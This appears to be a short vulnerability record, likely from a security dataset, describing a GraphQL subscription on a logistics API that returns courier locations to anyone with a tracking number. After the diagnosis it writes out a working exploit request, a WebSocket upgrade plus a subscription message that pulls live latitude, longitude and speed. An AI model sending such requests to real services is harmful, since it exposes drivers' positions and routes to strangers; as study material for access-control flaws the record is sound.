diagnosis: The subscription matches courier updates only against trackingNumber without validating whether context.user is either the delivery recipient or the dispatch agent. An unprivileged user with a known tracking number can track driver coordinates and delivery routes.
exploit_request:
POST /graphql HTTP/1.1
Host: api.logistics.com
Upgrade: websocket
Sec-WebSocket-Protocol: graphql-ws

{"type": "start", "id": "sub_gps", "payload": {"query": "subscription { courierLocationUpdated(trackingNumber: \"TRK-8921-990\") { lat lng speed } }"}}
